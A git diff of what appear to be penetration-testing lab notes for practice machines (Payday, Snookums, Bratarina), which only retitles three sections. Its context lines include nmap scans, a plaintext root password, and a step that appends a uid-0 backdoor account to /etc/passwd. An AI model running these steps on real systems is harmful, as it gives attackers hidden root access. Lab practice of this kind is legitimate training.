@@ -102,7 +102,7 @@ su -
 Password: ClogKingpinInning731
 ```
 
-### Payday 
+### Payday : CS-Cart - sudo -l
 ```shell
 # port scan
 sudo nmap -sC -sV -Pn -p- 192.168.207.39 -oN 207.39_allport
@@ -136,7 +136,7 @@ sudo -l
 sudo su
 
 ```
-### Snookums : SimplePHPGal - 
+### Snookums : SimplePHPGal - passwd
 ```shell
 # port scan
 sudo nmap -sC -sV -Pn -p- 192.168.207.58 -oN 207.58_allport
@@ -193,7 +193,7 @@ openssl passwd -1 -salt password password
 echo 'owned:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:owned:/root:/bin/bash' >> /etc/passwd
 
 ```
-### Bratarina
+### Bratarina : SMTP
 ```shell
 # port scan
 sudo nmap -sC -sV -Pn -p- 192.168.207.71 -oN 207.71_allport
